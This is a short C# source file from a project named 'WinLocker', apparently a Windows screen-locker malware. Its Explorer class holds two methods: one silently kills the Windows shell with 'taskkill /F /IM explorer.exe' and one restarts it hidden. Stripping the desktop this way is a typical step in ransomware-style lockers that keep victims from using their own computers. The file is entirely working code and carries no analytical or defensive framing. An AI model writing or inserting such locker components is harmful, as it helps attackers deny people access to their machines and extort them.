using System.Diagnostics;

namespace WinLocker
{
    internal class Explorer
    {
        public static void Start()
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo(Path.Combine(Environment.GetEnvironmentVariable("windir"), "explorer.exe"));
            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;
            procStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            Process process = new Process();
            process.StartInfo = procStartInfo;
            process.Start();
        }

        public static void Stop()
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo("taskkill.exe", "/F /IM explorer.exe");
            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;
            procStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            Process process = new Process();
            process.StartInfo = procStartInfo;
            process.Start();
        }
    }
}
